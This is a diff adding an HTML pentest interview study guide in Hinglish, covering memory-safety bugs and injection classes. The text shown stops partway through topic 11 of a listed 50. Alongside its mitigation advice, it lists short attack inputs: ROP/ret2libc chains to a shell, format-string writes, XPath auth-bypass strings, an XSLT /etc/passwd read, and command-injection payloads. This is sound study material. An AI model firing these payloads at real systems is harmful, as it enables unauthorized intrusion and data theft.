@@ -1,0 +1,1177 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Pentest Interview Master Guide — Part 3 (Advanced Deep-Dives)</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:'Segoe UI',system-ui,Arial,sans-serif;background:#0d1117;color:#c9d1d9;line-height:1.6}
+header{background:#161b22;border-bottom:1px solid #30363d;padding:16px 24px;position:sticky;top:0;z-index:10;display:flex;align-items:center;gap:16px;flex-wrap:wrap}
+h1{color:#58a6ff;font-size:1.25rem;flex:1;min-width:220px}
+#q{background:#0d1117;border:1px solid #30363d;color:#e6edf3;padding:8px 12px;border-radius:8px;width:280px;font-size:.9rem}
+#q:focus{outline:1px solid #58a6ff}
+#count{color:#8b949e;font-size:.8rem;white-space:nowrap}
+.btn{background:#238636;color:#fff;border:none;padding:8px 14px;border-radius:8px;cursor:pointer;font-size:.85rem;font-weight:600}
+.btn:hover{background:#2ea043}
+.wrap{display:flex;align-items:flex-start}
+nav{width:300px;position:sticky;top:74px;max-height:calc(100vh - 90px);overflow:auto;padding:16px;border-right:1px solid #30363d;flex-shrink:0}
+nav .cat{color:#f0883e;font-weight:700;font-size:.72rem;text-transform:uppercase;letter-spacing:1px;margin:14px 0 4px}
+nav a{display:block;color:#8b949e;text-decoration:none;padding:3px 8px;border-radius:6px;font-size:.82rem;border-left:2px solid transparent}
+nav a:hover{background:#21262d;color:#58a6ff;border-left-color:#58a6ff}
+main{flex:1;padding:24px;max-width:960px;min-width:0}
+.intro{background:#161b22;border:1px solid #30363d;border-radius:10px;padding:16px 20px;margin-bottom:20px;font-size:.92rem}
+.intro b{color:#58a6ff}
+.category{color:#f0883e;font-weight:800;margin:28px 0 10px;text-transform:uppercase;font-size:.85rem;letter-spacing:1.5px;border-bottom:1px solid #30363d;padding-bottom:6px}
+.topic{background:#161b22;border:1px solid #30363d;border-radius:10px;padding:18px 20px;margin-bottom:16px}
+.topic h2{color:#e6edf3;font-size:1.08rem;margin-bottom:10px;border-bottom:1px solid #30363d;padding-bottom:8px}
+.topic h2 .n{color:#f0883e;margin-right:8px;font-weight:800}
+.def{border-left:3px solid #58a6ff;padding-left:12px;margin-bottom:10px;font-size:.93rem}
+.impact{border-left:3px solid #f85149;padding-left:12px;margin-bottom:10px;font-size:.93rem}
+.mit{border-left:3px solid #3fb950;padding-left:12px;margin-bottom:10px;font-size:.93rem}
+.tc{border-left:3px solid #d29922;padding-left:12px;margin-bottom:10px;font-size:.93rem}
+.sc{border-left:3px solid #bc8cff;padding-left:12px;font-size:.93rem}
+.lbl{display:inline-block;font-size:.68rem;font-weight:800;letter-spacing:1px;text-transform:uppercase;color:#0d1117;padding:1px 8px;border-radius:10px;margin-bottom:3px}
+.lbl.ld{background:#58a6ff}.lbl.li{background:#f85149}.lbl.lm{background:#3fb950}.lbl.lt{background:#d29922}.lbl.ls{background:#bc8cff}
+ul{margin:4px 0 4px 20px}
+li{margin:3px 0}
+code{background:#0d1117;border:1px solid #30363d;padding:1px 6px;border-radius:5px;color:#79c0ff;font-size:.85em;word-break:break-all}
+footer{color:#8b949e;font-size:.8rem;text-align:center;padding:20px}
+@media(max-width:860px){.wrap{flex-direction:column}nav{position:static;width:auto;max-height:none;border-right:none;border-bottom:1px solid #30363d}}
+</style>
+</head>
+<body>
+<header>
+  <h1>Pentest Interview Master Guide — Part 3 (Advanced Deep-Dives)</h1>
+  <input id="q" type="text" placeholder="Search topics (e.g. buffer, oauth, graphql, race, kubernetes)...">
+  <span id="count">50 topics</span>
+  <button class="btn" onclick="window.print()">Print / PDF</button>
+</header>
+<div class="wrap">
+<nav>
+  <div class="cat">Memory Safety &amp; Low-Level</div>
+  <a href="#t01">01. Buffer Overflow — Stack Smashing</a>
+  <a href="#t02">02. Heap Overflow, UAF &amp; Double Free</a>
+  <a href="#t03">03. Format String Vulnerabilities</a>
+  <a href="#t04">04. Integer Overflow &amp; Type Confusion</a>
+  <a href="#t05">05. Why malloc Is Dangerous</a>
+  <a href="#t06">06. Shellcode &amp; Exploit Mitigations</a>
+  <a href="#t07">07. Bypass — ROP &amp; ret2libc</a>
+  <a href="#t08">08. Fuzzing</a>
+  <a href="#t09">09. Race Conditions — Deep Dive</a>
+  <div class="cat">Advanced Injection</div>
+  <a href="#t10">10. XML &amp; XPath Injection</a>
+  <a href="#t11">11. Command Injection</a>
+  <a href="#t12">12. LDAP Injection</a>
+  <a href="#t13">13. NoSQL Injection</a>
+  <a href="#t14">14. SMTP / Email Header Injection</a>
+  <a href="#t15">15. HTTP Verb Tampering</a>
+  <a href="#t16">16. CSV / Formula Injection</a>
+  <a href="#t17">17. Server-Side JS Injection (Node.js)</a>
+  <div class="cat">AuthN / AuthZ / Session</div>
+  <a href="#t18">18. Authentication Flaws Checklist</a>
+  <a href="#t19">19. Authorization Flaws Checklist</a>
+  <a href="#t20">20. Session Management — Deep Dive</a>
+  <a href="#t21">21. Password Reset Flaws</a>
+  <a href="#t22">22. OAuth 2.0 Grant Types</a>
+  <a href="#t23">23. SSO &amp; SAML Attacks</a>
+  <a href="#t24">24. BAC — A01 Deep Dive</a>
+  <div class="cat">Web Platform &amp; Advanced</div>
+  <a href="#t25">25. Web Cache Poisoning &amp; Deception</a>
+  <a href="#t26">26. Request Smuggling — All Types</a>
+  <a href="#t27">27. GraphQL Security</a>
+  <a href="#t28">28. WebSockets Security</a>
+  <a href="#t29">29. Microservices Security</a>
+  <a href="#t30">30. PDF / Report Generation Attacks</a>
+  <a href="#t31">31. Image Processing Attacks</a>
+  <a href="#t32">32. Zip Slip &amp; Archive Attacks</a>
+  <a href="#t33">33. OpenID Connect — ID Token Validation</a>
+  <a href="#t34">34. Supply Chain Attacks</a>
+  <div class="cat">Mobile &amp; Cloud</div>
+  <a href="#t35">35. Android Deep Links &amp; Intent Redirection</a>
+  <a href="#t36">36. iOS Security Checklist</a>
+  <a href="#t37">37. Flutter &amp; React Native Security</a>
+  <a href="#t38">38. Cloud Security Basics</a>
+  <a href="#t39">39. Kubernetes Security</a>
+  <a href="#t40">40. OWASP MASVS / MSTG</a>
+  <div class="cat">Process, Frameworks &amp; Career</div>
+  <a href="#t41">41. OWASP Top 10 vs SANS Top 25</a>
+  <a href="#t42">42. OWASP ASVS &amp; WSTG</a>
+  <a href="#t43">43. CVSS v3.1 — Deep Dive</a>
+  <a href="#t44">44. Threat Modeling — STRIDE / DREAD</a>
+  <a href="#t45">45. Incident Response — NIST Phases</a>
+  <a href="#t46">46. Red vs Blue vs Purple Team</a>
+  <a href="#t47">47. Compliance — ISO 27001, NIST CSF, PCI</a>
+  <a href="#t48">48. Vulnerability Management Lifecycle</a>
+  <a href="#t49">49. DevSecOps — CI/CD Security</a>
+  <a href="#t50">50. Final Cheat Sheet &amp; Scenario Q&amp;A</a>
+</nav>
+
+<main>
+<div class="intro"><b>How to use:</b> Part 3 = advanced deep-dives. Same 5-part format: <b>Definition, Impact, Mitigation (5 points), Test Cases (Hinglish), Real-world Scenario</b>. Parts 1 (web/API/mobile vulns) + 2 (network/process/tools) + 3 (advanced) = full coverage of your interview list. Search box filter + Print/PDF for revision.</div>
+
+<!-- ==================== MEMORY SAFETY ==================== -->
+<h3 class="category">Memory Safety &amp; Low-Level</h3>
+
+<section class="topic" id="t01">
+<h2><span class="n">01</span>Buffer Overflow — Stack Smashing Basics</h2>
+<div class="def"><span class="lbl ld">Definition</span><br>Program user input ko fixed-size buffer mein copy karta hai bina bounds check (<code>strcpy</code>, <code>gets</code>, <code>sprintf</code>) — input buffer se zyada lamba hota hai to adjacent stack memory overwrite hoti hai. Attacker <b>return address (EIP/RIP)</b> overwrite karke execution flow apne shellcode/jump target par le jaata hai. Pattern: <code>A*offset + EIP_override + shellcode/NOP-sled</code>. Detection: crash on long input (fuzzing), gdb se offset nikaalo (pattern_create/pattern_offset), EIP control confirm karo.</div>
+<div class="impact"><span class="lbl li">Impact</span><br>Remote/local RCE (classic: MS08-067, EternalBlue SMB), DoS (crash), privilege escalation — CVSS 9.8. Legacy C/C++ services, network daemons, parsers sabse vulnerable.</div>
+<div class="mit"><span class="lbl lm">Mitigation (5 points)</span><ul>
+<li>Use memory-safe languages (Rust, Go, Java) for new code.</li>
+<li>Bounds-checked functions: <code>strncpy</code>/<code>snprintf</code>/<code>memcpy_s</code>, or C++ std::string/vector.</li>
+<li>Compiler hardening: <code>-fstack-protector-all</code> (canaries), <code>-fPIE</code>, <code>-D_FORTIFY_SOURCE=2</code>.</li>
+<li>OS mitigations: ASLR, NX/DEP, W^X (topics 06-07).</li>
+<li>SAST + fuzzing in CI (topic 08) — overflow classes early detect karo.</li></ul></div>
+<div class="tc"><span class="lbl lt">Test Cases (Hinglish)</span><ul>
+<li>Fuzz: 100/500/1000 char input bhejo — crash/segfault aata hai?</li>
+<li>gdb: <code>gdb ./vuln</code> → run with pattern → <code>info registers eip</code> — overwritten?</li>
+<li>Offset: <code>pattern_create -l 500</code> then <code>pattern_offset</code> — exact offset milega.</li>
+<li>EIP control: <code>A*offset + "BBBB"</code> — gdb mein EIP=0x42424242?</li>
+<li>checksec: <code>checksec ./vuln</code> — canary/NX/PIE enabled hain?</li>
+<li>Metasploit: <code>pattern_offset</code> + <code>msfvenom</code> shellcode (topic 06 Part 2).</li></ul></div>
+<div class="sc"><span class="lbl ls">Real-world Scenario</span><br>EternalBlue (MS17-010): SMBv1 mein buffer overflow — WannaCry ransomware ne 150+ countries mein 2 lakh+ systems encrypt kiye. Fix: patch + SMBv1 disable + memory-safe rewrite.</div>
+</section>
+
+<section class="topic" id="t02">
+<h2><span class="n">02</span>Heap Overflow, Use-After-Free &amp; Double Free</h2>
+<div class="def"><span class="lbl ld">Definition</span><br><b>Heap overflow:</b> heap-allocated buffer se zyada write — adjacent heap metadata/objects corrupt. <b>Use-After-Free (UAF):</b> freed memory ko phir use karna — attacker freed chunk ko apne data se replace karke function pointer/object vtable hijack karta hai. <b>Double free:</b> same chunk do baar free — allocator metadata corruption (glibc tcache dup, fastbin dup) → arbitrary write/alloc → RCE. Browser/PDF parsers, Chrome V8, glibc applications mein common.</div>
+<div class="impact"><span class="lbl li">Impact</span><br>RCE (browser exploits chain UAF+type confusion), info leak, DoS. Chrome/Firefox 0-days ka core bug class.</div>
+<div class="mit"><span class="lbl lm">Mitigation (5 points)</span><ul>
+<li>Safe languages/RAII (Rust ownership, C++ smart pointers) — UAF compile-time khatam.</li>
+<li>Never free then use — null pointers after free; double-free guards.</li>
+<li>Allocator hardening: ASLR, guard pages, tcache key checks (glibc 2.32+).</li>
+<li>Sandboxing: browsers isolate renderer processes (exploit impact limit).</li>
+<li>Fuzzing + ASAN (AddressSanitizer) — UAF/heap bugs CI mein pakdo.</li></ul></div>
+<div class="tc"><span class="lbl lt">Test Cases (Hinglish)</span><ul>
+<li>ASAN build: <code>gcc -fsanitize=address</code> — UAF/double-free turant report hota hai.</li>
+<li>UAF repro: object free karke phir use karo — crash/ASAN error?</li>
+<li>Double free: same pointer do baar free karo — glibc abort/ASAN detect?</li>
+<li>Heap overflow: <code>malloc(8)</code> par 16 bytes write karo — ASAN "heap-buffer-overflow".</li>
+<li>Exploit path: freed object ka function pointer overwrite — EIP control (advanced lab).</li>
+<li>Browser: <code>--enable-sandbox</code> off/on behavior — sandbox escape test (lab).</li></ul></div>
+<div class="sc"><span class="lbl ls">Real-world Scenario</span><br>Chrome V8 UAF + type confusion chain — in-the-wild 0-day (CVE-2023-2033 class) — attacker ne sandbox escape karke full system RCE kiya. Fix: patch + sandbox + site isolation.</div>
+</section>
+
+<section class="topic" id="t03">
+<h2><span class="n">03</span>Format String Vulnerabilities</h2>
+<div class="def"><span class="lbl ld">Definition</span><br><code>printf(user_input)</code> — user input directly format string ban jaata hai. Attackers <code>%x</code>/<code>%p</code> se <b>stack data leak</b> (addresses, canaries, pointers), <code>%s</code> se arbitrary memory read, <code>%n</code> se <b>arbitrary write</b> (write byte count to address on stack) → EIP overwrite → RCE. Detection: input mein <code>%x</code> daalo — hexadecimal values leak hote hain?</div>
+<div class="impact"><span class="lbl li">Impact</span><br>Information disclosure (stack/canary leak → ASLR bypass), arbitrary write → RCE, DoS (<code>%s</code> on bad pointer). Classic: wu-ftpd, ProFTPD, Linux kernel (vsyscall).</div>
+<div class="mit"><span class="lbl lm">Mitigation (5 points)</span><ul>
+<li>Never pass user input as format string: <code>printf("%s", input)</code> — never <code>printf(input)</code>.</li>
+<li>Compiler: <code>-Wformat-security</code> + <code>-Wformat=2</code> — warnings fail karo.</li>
+<li>Static analysis (Semgrep/CodeQL: "format string" patterns).</li>
+<li>Modern mitigations: ASLR + PIE + RELRO (GOT read-only) se %n exploitation hard.</li>
+<li>Code review: saare printf/sprintf/syslog calls check karo.</li></ul></div>
+<div class="tc"><span class="lbl lt">Test Cases (Hinglish)</span><ul>
+<li>Input mein <code>%x%x%x%x</code> daalo — hex values return aate hain? (leak).</li>
+<li><code>%p %p %p %p</code> — pointer leak; <code>%s</code> — memory read attempt (careful DoS).</li>
+<li><code>%n</code> test: write attempt — crash hota hai? (confirm vuln).</li>
+<li>gdb: format string ke through EIP overwrite chain demo (advanced lab).</li>
+<li>Audit: <code>grep -rn "printf(" code/</code> — user input direct? Semgrep rule chalao.</li></ul></div>
+<div class="sc"><span class="lbl ls">Real-world Scenario</span><br>ProFTPD 1.3.3c mein format string — remote attacker ne <code>%n</code> se EIP overwrite karke shell liya (CVE-2010-4221). Fix: format string fix + ASLR/PIE deployment.</div>
+</section>
+
+<section class="topic" id="t04">
+<h2><span class="n">04</span>Integer Overflow &amp; Type Confusion</h2>
+<div class="def"><span class="lbl ld">Definition</span><br><b>Integer overflow:</b> arithmetic result type ki limit cross karta hai — <code>size_t</code> overflow: <code>malloc(size + 1)</code> jahan size=0xFFFFFFFF → 0 → chhota buffer, baad mein bada write (heap overflow chain). Signed/unsigned confusion: negative length as huge unsigned → bounds bypass. <b>Type confusion:</b> object ko galat type treat karna (casting) — attacker object layout control karke vtable/function pointer abuse (browser engine favourite).</div>
+<div class="impact"><span class="lbl li">Impact</span><br>Heap overflow chains → RCE (browsers, PDF parsers), auth bypass (length checks bypass), DoS. CVE-2019-2215 (Android), iPhone jailbreaks mein common.</div>
+<div class="mit"><span class="lbl lm">Mitigation (5 points)</span><ul>
+<li>Safe integer arithmetic (checked_add, __builtin_add_overflow, Rust checked ops).</li>
+<li>Never trust user-controlled sizes; validate range BEFORE allocation/copy.</li>
+<li>Use unsigned types carefully; avoid mixed sign comparisons (<code>-Wsign-compare</code>).</li>
+<li>Type safety: avoid unsafe casts; use typed containers; runtime type checks (RTTI/instanceof).</li>
+<li>Sanitizers: UBSan/ASAN in CI (undefined behavior early detect).</li></ul></div>
+<div class="tc"><span class="lbl lt">Test Cases (Hinglish)</span><ul>
+<li>Length params: <code>len=0xFFFFFFFF</code>, <code>len=-1</code>, <code>len=2147483648</code> bhejo — allocation behaviour?</li>
+<li>Arithmetic bypass: size+header overflow — bada write chhote buffer mein?</li>
+<li>UBSan: <code>-fsanitize=undefined</code> — overflow warnings milti hain?</li>
+<li>Type confusion: JSON/API mein object type change karke (array↔object) — app crash/behavior?</li>
+<li>Chunk size: zlib/PDF parsers par crafted sizes — ASAN detect?</li></ul></div>
+<div class="sc"><span class="lbl ls">Real-world Scenario</span><br>CVE-2019-2215 (Android binder): UAF + type confusion — rooted exploit chain se kernel RCE; fixed in patch. Lesson: parsers/types hamesha fuzz + sanitize.</div>
+</section>
+
+<section class="topic" id="t05">
+<h2><span class="n">05</span>Why malloc Is Dangerous — &amp; Safer Alternatives</h2>
+<div class="def"><span class="lbl ld">Definition</span><br><code>malloc/free</code> (manual memory management) dangerous kyun: <b>1. buffer overflow</b> (size mismatch), <b>2. use-after-free</b> (free ke baad use), <b>3. double free</b>, <b>4. memory leaks</b> (free bhoolna → DoS via exhaustion), <b>5. no bounds safety</b> (pointer arithmetic galat). <b>Safer alternatives:</b> <b>RAII + smart pointers</b> (C++ unique_ptr/shared_ptr), <b>GC languages</b> (Java, Go, Python — automatic), <b>Rust ownership model</b> (compile-time memory safety), <b>arena/region allocators</b>, <b>safe string/container APIs</b> (std::string, vector), <b>valgrind/ASAN</b> for detection.</div>
+<div class="impact"><span class="lbl li">Impact</span><br>Manual memory bugs = RCE, leaks = DoS. OWASP/Google data: ~70% of security bugs memory-related (Microsoft/Chrome). Safer languages eliminate entire bug classes.</div>
+<div class="mit"><span class="lbl lm">Mitigation (5 points)</span><ul>
+<li>New projects: memory-safe languages (Rust, Go, Java/Kotlin, Swift).</li>
+<li>C++: smart pointers + RAII, avoid raw new/delete/malloc.</li>
+<li>Legacy C: bounds-checked functions + compiler hardening (topic 01).</li>
+<li>Tooling: ASAN/Valgrind/AddressSanitizer in test pipelines.</li>
+<li>Limit attack surface: parsers sandbox mein (chrome sandbox model).</li></ul></div>
+<div class="tc"><span class="lbl lt">Test Cases (Hinglish)</span><ul>
+<li>Leak detection: <code>valgrind --leak-check=full ./app</code> — leaks report.</li>
+<li>ASAN: UAF/double-free/heap-overflow build mein turant error (topics 01-02).</li>
+<li>Code audit: <code>grep -rn "malloc("</code> — kahan use ho raha hai? bounds safe?</li>
+<li>DoS test: app ko repeated allocations par chalao — memory exhaustion hota hai? (authorized).</li>
+<li>Rust/Go rewrite comparison: same feature — memory bug classes eliminated?</li></ul></div>
+<div class="sc"><span class="lbl ls">Real-world Scenario</span><br>Chrome/Windows team ne C++ → Rust migration start kiya kyunki memory bugs security bug list mein #1 the — Rust code mein UAF class compile-time hi khatam. Interview answer: "malloc se UAF/double-free/leaks aate hain — safer: RAII, GC, Rust ownership."</div>
+</section>
+
+<section class="topic" id="t06">
+<h2><span class="n">06</span>Shellcode &amp; Exploit Mitigations (ASLR, NX, Canary, PIE, RELRO)</h2>
+<div class="def"><span class="lbl ld">Definition</span><br>Modern mitigations jo buffer overflow exploitation rokती hain: <b>ASLR</b> — stack/heap/libs random addresses (hardcoded addresses fail); <b>NX/DEP</b> — stack non-executable (shellcode seedha nahi chal sakta); <b>Stack canary</b> — return address ke aage random value; overwrite detect → abort; <b>PIE</b> — binary itself random base; <b>RELRO</b> — GOT (function pointers table) read-only (full RELRO) → GOT overwrite blocked; <b>CFI/CET</b> — indirect call targets validate. Attackers inhe bypass karte hain (ROP, ret2libc, leaks, partial overwrite — topic 07).</div>
+<div class="impact"><span class="lbl li">Impact</span><br>Mitigations ke bina = trivial RCE; ke saath = exploitation kaafi hard (info leak pehle chahiye). Isliye modern exploits hamesha leak + ROP chain use karte hain.</div>
+<div class="mit"><span class="lbl lm">Mitigation (5 points)</span><ul>
+<li>Enable ALL: ASLR (kernel), NX, canaries, PIE, full RELRO (distro default hardened).</li>
+<li>CFI/CET (Intel CET, Clang CFI) for indirect call protection.</li>
+<li>W^X: memory kabhi executable+writeable nahi.</li>
+<li>Sandboxing + seccomp — exploit ke baad impact limit.</li>
+<li>Patch + fuzz — bugs nahi hone dena best mitigation.</li></ul></div>
+<div class="tc"><span class="lbl lt">Test Cases (Hinglish)</span><ul>
+<li><code>checksec --file=./vuln</code> — canary, NX, PIE, RELRO status dekho.</li>
+<li>ASLR test: <code>cat /proc/sys/kernel/randomize_va_space</code> — 2 = full ASLR.</li>
+<li>Retry exploit 10 baar — ASLR ki wajah se address change hota hai? (crash inconsistency).</li>
+<li>Canary test: overflow mein 1 byte badlo — "stack smashing detected" error?</li>
+<li>NX test: shellcode stack par — execution denied (SIGSEGV)?</li>
+<li>RELRO: <code>readelf -l ./vuln</code> — GNU_RELRO + BIND_NOW present?</li></ul></div>
+<div class="sc"><span class="lbl ls">Real-world Scenario</span><br>Vulnerable service par canary+NX+ASLR sab on — basic shellcode exploit fail; attacker ne format string se canary+libc leak karke ROP chain banaya (next topic) — mitigations exploit ko hard banati hain, impossible nahi.</div>
+</section>
+
+<section class="topic" id="t07">
+<h2><span class="n">07</span>Bypassing Mitigations — ROP, ret2libc, JOP</h2>
+<div class="def"><span class="lbl ld">Definition</span><br>NX ke baad bhi exploitation: <b>ret2libc</b> — stack par <code>system("/bin/sh")</code> ka address daalo (libc executable hai); <b>ROP (Return-Oriented Programming)</b> — existing code ke "gadgets" (ret se end hone wale instruction sequences) chain karke arbitrary logic — <code>pop rdi; ret</code> + <code>"/bin/sh"</code> + <code>system</code>; <b>JOP</b> — indirect jumps se same; <b>ret2plt/ret2dl</b> — ASLR ke bina libc address; <b>partial overwrite</b> — ASLR se sirf high bytes random. Leak (format string/UAF) se ASLR bypass hota hai. Tools: pwntools, ROPgadget, ropper, one_gadget.</div>
+<div class="impact"><span class="lbl li">Impact</span><br>Mitigations bypass → RCE remains possible on hardened systems (given a bug + leak). Real-world exploits (browser, kernel) ROP chains use karte hain.</div>
+<div class="mit"><span class="lbl lm">Mitigation (5 points)</span><ul>
+<li>CFI/CET — ROP gadgets ka use detect/block karta hai (indirect branch tracking).</li>
+<li>Fine-grained ASLR (function-level, not just base) — leak ke baad bhi hard.</li>
+<li>Remove gadgets: compile with <code>-fno-stack-protector</code> nahi — actually strip unneeded code, CET shadow stack.</li>
+<li>Kernel: kASLR + heap randomization + CONFIG_STRICT_KERNEL_RWX.</li>
+<li>Bug elimination (fuzz/SAST) + sandbox — best defence.</li></ul></div>
+<div class="tc"><span class="lbl lt">Test Cases (Hinglish)</span><ul>
+<li>Ret2libc: libc base leak (format string) → <code>system = base + offset</code> → payload chain.</li>
+<li>ROPgadget: <code>ROPgadget --binary ./vuln --only "pop|ret"</code> — gadgets dhundho.</li>
+<li>pwntools: <code>from pwn import *; r = ROP(elf)</code> — chain auto-build.</li>
+<li>one_gadget: <code>one_gadget /lib/x86_64-linux-gnu/libc.so.6</code> — constraints check.</li>
+<li>checksec + exploit attempt: CET enabled system par ROP fail hota hai? (lab).</li></ul></div>
+<div class="sc"><span class="lbl ls">Real-world Scenario</span><br>CTF/lab: NX+ASLR wala binary — format string se libc leak → <code>pop rdi; ret</code> gadget + system("/bin/sh") — ROP chain se shell. Real world: browser 0-days isi pattern se sandbox escape tak jaate hain.</div>
+</section>
+
+<section class="topic" id="t08">
+<h2><span class="n">08</span>Fuzzing — AFL++, libFuzzer, Web Fuzzing</h2>
+<div class="def"><span class="lbl ld">Definition</span><br>Fuzzing = automated random/mutated inputs se crash/vuln find karna. <b>Coverage-guided:</b> AFL++ (compile with afl-clang-fast, seed corpus, mutations, coverage feedback), libFuzzer (in-process harness + sanitizers), honggfuzz; <b>web/API fuzzing:</b> ffuf/gobuster (paths/params), Burp Intruder, wfuzz; <b>protocol:</b> boofuzz (network protocols). Flow: target + seed corpus → run hours/days → crashes → triage (ASAN report) → minimize (afl-tmin) → root cause. OSS-Fuzz: Google ka free fuzzing infra — 1000+ projects, thousands of bugs.</div>
+<div class="impact"><span class="lbl li">Impact</span><br>Heartbleed (2014) fuzzing se mila; OSS-Fuzz se 30k+ bugs — fuzzing sabse effective bug-discovery method for parsers/memory-unsafe code.</div>
+<div class="mit"><span class="lbl lm">Mitigation (5 points)</span><ul>
+<li>Fuzz parsers/input-handling code in CI (regression + new code).</li>
+<li>Run with sanitizers (ASAN/UBSAN/MSAN) — crashes meaningful.</li>
+<li>Maintain seed corpus + crash corpus; triage pipeline.</li>
+<li>Use OSS-Fuzz for open-source deps (supply chain).</li>
+<li>Web: parameter/endpoint fuzzing as part of pentest (Intruder, ffuf).</li></ul></div>
+<div class="tc"><span class="lbl lt">Test Cases (Hinglish)</span><ul>
+<li>AFL++: <code>afl-fuzz -i seeds/ -o out/ -- ./target @@</code> — crashes milte hain?</li>
+<li>libFuzzer: <code>clang -fsanitize=fuzzer,address harness.c</code> — auto fuzz.</li>
+<li>ASAN triage: crash report mein overflow/UAF type clear hai?</li>
+<li>Web: <code>ffuf -w params.txt -u https://target/api/FUZZ</code> — 500s/errors detect.</li>
+<li>Boofuzz: custom protocol script — malformed packets se crash?</li>
+<li>Minimize: <code>afl-tmin -i crash -o min -- target</code> — smallest repro.</li></ul></div>
+<div class="sc"><span class="lbl ls">Real-world Scenario</span><br>OSS-Fuzz ne libarchive/OpenSSL ke 100+ bugs pakde (Heartbleed class) — production breach se pehle. Interview answer: "Fuzzing parsers + sanitizers in CI — thousands of bugs milte hain jo manual testing se miss ho jaate."</div>
+</section>
+
+<section class="topic" id="t09">
+<h2><span class="n">09</span>Race Conditions — Deep Dive (TOCTOU, Double-Spend, Parallel Requests)</h2>
+<div class="def"><span class="lbl ld">Definition</span><br>Race condition = timing gap between check aur use. <b>TOCTOU (Time-of-Check to Time-of-Use):</b> file permission check → use (attacker beech mein change karta hai — symlink swap). <b>Double-spend:</b> balance/coupon check → debit — parallel requests gap mein dono pass ho jaate hain (gift card 50x redeem). <b>Web race:</b> OTP verify (parallel guesses), coupon apply, withdrawal, quantity update, signup bonus, like/follow counts. <b>Detection:</b> Burp Turbo Intruder / custom script — same request 20-100 parallel threads; compare responses/balances.</div>
+<div class="impact"><span class="lbl li">Impact</span><br>Financial loss (unlimited redeem/withdrawal), account takeover (OTP race), business logic abuse — High/Critical in fintech.</div>
+<div class="mit"><span class="lbl lm">Mitigation (5 points)</span><ul>
+<li>Atomic DB operations: row locks (<code>SELECT ... FOR UPDATE</code>), transactions with proper isolation.</li>
+<li>Idempotency keys — same operation ID ek baar hi process hoga.</li>
+<li>Unique constraints (coupon_user unique) — DB level duplicate roko.</li>
+<li>Optimistic locking (version column) — stale updates reject.</li>
+<li>Server-side single-threaded processing per resource (queue/lock).</li></ul></div>
+<div class="tc"><span class="lbl lt">Test Cases (Hinglish)</span><ul>
+<li>Turbo Intruder: same redeem request 50 concurrent — balance 50x badha?</li>
+<li>OTP race: verify request parallel 10 — multiple successes? (Part 1 topic 32).</li>
+<li>Withdrawal race: 2 transactions parallel — balance negative hota hai?</li>
+<li>TOCTOU: file upload/check-then-use flows — beech mein tamper window (authorized lab).</li>
+<li>Coupon: parallel apply — do baar use hota hai? (DB constraint test).</li>
+<li>Retry: request replay after success — idempotency missing? (topic 41 Part 1).</li></ul></div>
+<div class="sc"><span class="lbl ls">Real-world Scenario</span><br>Cryptocurrency exchange: withdraw request parallel threads — same balance se 2 withdrawals approve hue (double-spend). Fix: row lock + idempotency key + reconciliation.</div>
+</section>
+
+<!-- ==================== ADVANCED INJECTION ==================== -->
+<h3 class="category">Advanced Injection</h3>
+
+<section class="topic" id="t10">
+<h2><span class="n">10</span>XML Injection &amp; XPath Injection</h2>
+<div class="def"><span class="lbl ld">Definition</span><br><b>XML injection:</b> attacker XML structure mein apne elements/attributes inject karta hai — <code>&lt;user&gt;&lt;role&gt;admin&lt;/role&gt;&lt;/user&gt;</code> modify, config tamper, extra data. <b>XPath injection:</b> XML query language (XPath) mein user input concatenate — auth bypass: <code>' or '1'='1</code> in login, <code>' or true()</code>, <code>' or 1=1] | //user[</code> style; data extraction bina SQL ke. <b>XSLT injection:</b> attacker-controlled stylesheet → <code>&lt;xsl:include&gt;</code>, <code>document()</code>, extension functions → file read/RCE (PHP/Saxon).</div>
+<div class="impact"><span class="lbl li">Impact</span><br>Auth bypass, XML data tampering, file read (XSLT), info disclosure — XML-based legacy systems (SOAP, configs, document workflows) mein common.</div>
+<div class="mit"><span class="lbl lm">Mitigation (5 points)</span><ul>
+<li>Parameterized XPath (variables/<code>fn:data</code>) — never string-concat user input.</li>
+<li>Validate/escape XPath special chars (<code>' " [ ]</code>) in queries.</li>
+<li>XML: strict schema (XSD) validation before processing.</li>
+<li>XSLT: disable extension functions/document access; allowlist stylesheets.</li>
+<li>Prefer JSON over XML for new APIs.</li></ul></div>
+<div class="tc"><span class="lbl lt">Test Cases (Hinglish)</span><ul>
+<li>Login: <code>' or '1'='1</code>, <code>' or 1=1--</code> in username — bypass?</li>
+<li>XPath error: <code>'</code> daalo — XPath error message aata hai? (info leak).</li>
+<li>Boolean: <code>' and 1=1</code> vs <code>' and 1=2</code> — responses differ?</li>
+<li>Extraction: <code>' or string-length(//user[1]/pass)&gt;8 and '1'='1</code> — blind.</li>
+<li>XML injection: POST body mein extra <code>&lt;role&gt;admin&lt;/role&gt;</code> — accepted?</li>
+<li>XSLT: stylesheet upload/test — <code>&lt;xsl:value-of select="document('/etc/passwd')"/&gt;</code>.</li></ul></div>
+<div class="sc"><span class="lbl ls">Real-world Scenario</span><br>SOAP-based banking API: XPath login query <code>//user[name='"+input+"']</code> — <code>' or '1'='1</code> se bina password login. Fix: parameterized XPath + WSDL auth.</div>
+</section>
+
+<section class="topic" id="t11">
+<h2><span class="n">11</span>Command Injection (OS Command Injection)</h2>
+<div class="def"><span class="lbl ld">Definition</span><br>User input directly OS command mein jaata hai: <code>system("ping " + ip)</code>, <code>exec()</code>, <code>Runtime.exec()</code>, <code>os.system()</code>, backticks in PHP. <b>In-band:</b> output response mein dikhta hai (<code>; id</code>, <code>| id</code>, <code>&amp;&amp; id</code>, <code>|| id</code>, <code>`id`</code>, <code>$(id)</code>). <b>Blind:</b> output nahi dikhta — time-based (<code>; sleep 5</code>, <code>ping -c 5 127.0.0.1</code>), OOB (curl to Collaborator), error-based. Windows: <code>| whoami</code>, <code>&amp; whoami</code>; Linux: <code>; whoami</code>, <code>$(whoami)</code>.</div>
+<div class="impact"><span class="lbl li">Impact</span><br>Full RCE as service user — file read/write, reverse shell, lateral movement, ransomware — Critical.</div>
+<div class="mit"><span class="lbl lm">Mitigation (5 points)</span><ul>
+<li>NEVER call OS commands with user input — use libraries/APIs instead.</li>
+<li>If unavoidable: strict allowlist of commands + args; no shell metacharacters.</li>
+<li>Parameterized exec with argument arrays (no shell interpretation).</li>
+<li>Least-privilege service account + chroot/container.</li>
